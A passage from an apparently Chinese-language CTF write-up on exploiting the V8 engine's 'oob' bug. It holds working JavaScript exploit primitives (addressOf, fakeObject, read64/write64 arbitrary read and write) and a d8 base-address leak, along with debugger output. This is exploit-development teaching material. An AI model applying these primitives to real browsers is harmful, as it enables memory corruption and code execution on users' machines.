class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000</span><br><span class="line">05:0028│   0x25641fd4dd90 ◂— 0x4000000000000000   &lt;--- 被覆盖</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90</span><br><span class="line">$18 &#x3D; 2</span><br></pre></td></tr></table></figure><p>可以发现v8的内存对象大致如下：其中<code>map pointer</code>描述数组对象的结构，<code>element pointer</code>是存储数组元素的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-32 : some pointer &#x2F;&#x2F; not related to the challenge. This is memory is also where the element pointer points at.</span><br><span class="line">-24 : length of segment</span><br><span class="line">-16 : element 0 </span><br><span class="line">-8  : element 1</span><br><span class="line">+0  : map pointer &#x2F;&#x2F; the address where the obj pointer points at</span><br><span class="line">+8  : property pointer</span><br><span class="line">+16 : element pointer &#x2F;&#x2F;pointing at location -32</span><br><span class="line">+24 : length( in the high four bytes )</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">DebugPrint: 0x3db1856cddd9: [JSArray]</span><br><span class="line"> - map: 0x0306e9582f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c8177d11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1bb28b3c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x26c38c5c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3db1856cdd81 &lt;Object map &#x3D; 0x306e9580459&gt;</span><br><span class="line">           1: 0x3db1856cde19 &lt;HeapNumber 2.2&gt;</span><br></pre></td></tr></table></figure><p>通过上述例子，我们可以看到我们所泄露出来的地址就是<code>map pointer</code>，而<code>map pointer</code>数组的指示其元素的类型，如果我们利用<code>oob</code>的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象 B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><p>如果我们定义一个 <code>FloatArray</code> 浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问 B[0] 返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问 B[0] 时，返回的就不是对象元素 B[0] ，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问 A[0] 时，返回的就不是浮点数 A[0]，而是以 A[0] 为内存地址的一个JavaScript对象了。</p><p>其实到现在可以简化一下漏洞：</p><ul><li>泄露 <code>map pointer</code></li><li>覆写 <code>map pointer</code></li></ul><h4 id="addressOf-amp-amp-fakeObject"><a href="#addressOf-amp-amp-fakeObject" class="headerlink" title="addressOf &amp;&amp; fakeObject"></a>addressOf &amp;&amp; fakeObject</h4><blockquote><p>我们得到的数据都是浮点数的形式，而我们需要的是其在内存中的16进制数据，所以需要浮点数和整数之间的转换</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//var test = &#123;&#125;;</span></span><br><span class="line"><span class="comment">//%DebugPrint(test);</span></span><br><span class="line"><span class="comment">//var testAddr = addressOf(test);</span></span><br><span class="line"><span class="comment">//console.log(&quot;[*] leak object addr: 0x&quot; + hex(testAddr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">v8/out.gn/x64.release$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">0x26ebb348f061 &lt;Object map = 0x2e6f2340459&gt;</span></span><br><span class="line"><span class="comment">[*] leak object addr: 0x000026ebb348f060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>我们可以写一个 js 数组伪造成一个 js 对象(结构如下)，那么当我们访问<code>fake_array[2]</code>的时候就会当成一个对象去访问，那么我们就可以修改他的值，从而实现任意地址写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map, </span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    i2f(<span class="number">0x4141414141414141</span>),  <span class="comment">//&lt;-- elements指针</span></span><br><span class="line">    i2f(<span class="number">0x400000000</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1111</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(a[<span class="number">0</span>]);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0de19: [JSArray]</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b1442f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dd1111 &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 2</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x296b7b3c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; &#123;</span></span><br><span class="line"><span class="comment">           0: 0x3f28a7f0dda9 &lt;Object map = 0x17f6b144ab39&gt;   &lt;--- elements point</span></span><br><span class="line"><span class="comment">           1: 0x3f28a7f0de59 &lt;HeapNumber 2.2&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0dda9: [JS_OBJECT_TYPE]                  &lt;--- elements point</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b144ab39 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dc2091 &lt;Object map = 0x17f6b1440229&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x394d91600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #a: 1111 (const data field 0)</span></span><br><span class="line"><span class="comment"> &#125;*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var a_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] addressOf a: 0x&quot; + hex(a_addr));</span></span><br><span class="line"><span class="comment">read64(a_addr);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment">write64(a_addr, 0x01020304n);</span></span><br><span class="line"><span class="comment">%SystemBreak();</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>方法A：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000038ebfeb8f9a0-0x8000 0x5000</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x38ebfeb89ef8 —▸ 0x1b4669081f49 ◂— 0x300001b46690801</span><br><span class="line">4ac:2560│   0x38ebfeb89f00 ◂— 0x7b837e1e6</span><br><span class="line">4ad:2568│   0x38ebfeb89f08 —▸ 0xcd44db0a001 ◂— 0xe600001b46690804</span><br><span class="line">4ae:2570│   0x38ebfeb89f10 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4af:2578│   0x38ebfeb89f18 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">4b0:2580│   0x38ebfeb89f20 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4b1:2588│   0x38ebfeb89f28 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">pwndbg&gt; x&#x2F;gx 0x55dc49c98e40</span><br><span class="line">0x55dc49c98e40 &lt;_ZN2v812_GLOBAL__N_118WebAssemblyCompileERKNS_20FunctionCallbackInfoINS_5ValueEEE&gt;:0x56415741e5894855</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var start_addr &#x3D; addressOf(a);</span><br><span class="line">var leak_d8_addr &#x3D; 0n;</span><br><span class="line">start_addr &#x3D; start_addr-0x8000n;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    start_addr &#x3D; start_addr-8n;</span><br><span class="line">    leak_d8_addr &#x3D; read64(start_addr);</span><br><span class="line">    if(((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000560000000e40n)||((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000550000000e40n))&#123;</span><br><span class="line">        console.log(&quot;leak process addr success: &quot;+hex(leak_d8_addr));</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了半天，没泄露出来…</p><p>方法B：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*------------------------------leak d8------------------------------*&#x2F;</span><br><span class="line">var code &#x3D; read64(addressOf(floatArray.constructor)-0x1n+0x30n); &#x2F;&#x2F;get constructor.code ptr</span><br><span class="line">var d8Leak &#x3D; read64(code-0x1n+0x40n) &gt;&gt; 16n; &#x2F;&#x2F;read addr from &quot;mov r10, addr&quot;</span><br><span class="line">var d8Base &#x3D; d8Leak - 0xad54e0n;</span><br><span class="line">console.log(&quot;[*] d8 base : &quot; + hex(d8Base));</span><br></pre></td></tr></table></figure><blockquote><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test_array = [<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array.constructor);</span><br><span class="line">%SystemBreak();</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; pwd</span><br><span class="line">xxx/v8/out.gn/x64.debug</span><br><span class="line">...</span><br><span class="line">DebugPrint: <span class="number">0x24741f34ddb9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">DebugPrint: <span class="number">0x39ddc5310ec1</span>: [<span class="built_in">Function</span>] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5302109</span> &lt;JSFunction (sfi = <span class="number">0x18405dc08039</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x39ddc5311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x3fb2ce6c2d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x18405dc0aca1</span> &lt;SharedFunctionInfo <span class="built_in">Array</span>&gt;</span><br><span class="line"> - name: 0x2df35e643599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x39ddc5301869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x11c169a06c01</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x39ddc5311029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x18405dc00449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x18405dc00529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    <span class="number">0x2df35e644c79</span> &lt;<span class="built_in">Symbol</span>: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x2df35e644f41</span> &lt;<span class="built_in">Symbol</span>: <span class="built_in">Symbol</span>.species&gt;: <span class="number">0x39ddc5310fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: 0x39ddc5311069 &lt;JSFunction isArray (sfi = 0x18405dc0ad39)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x39ddc53110a1 &lt;JSFunction from (sfi = 0x18405dc0ad89)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x39ddc53110d9 &lt;JSFunction of (sfi = 0x18405dc0adc1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; job <span class="number">0x3fb2ce6c2ed9</span></span><br><span class="line"><span class="number">0x3fb2ce6c2ed9</span>: [<span class="built_in">Map</span>]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: <span class="number">0x3fb2ce6c2e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x18405dc00609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #1: 0x39ddc5311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x39ddc5311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     <span class="number">0x2df35e644ba1</span> &lt;<span class="built_in">Symbol</span>: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x3fb2ce6c2f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="keyword">constructor</span>: 0x39ddc5310ec1 &lt;JSFunction Array (sfi = 0x18405dc0aca1)&gt;</span><br><span class="line"> - dependent code: 0x2df35e6402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x39ddc5310ec1-1</span><br><span class="line">0x39ddc5310ec0:0x00003fb2ce6c2d490x000039ddc5311029</span><br><span 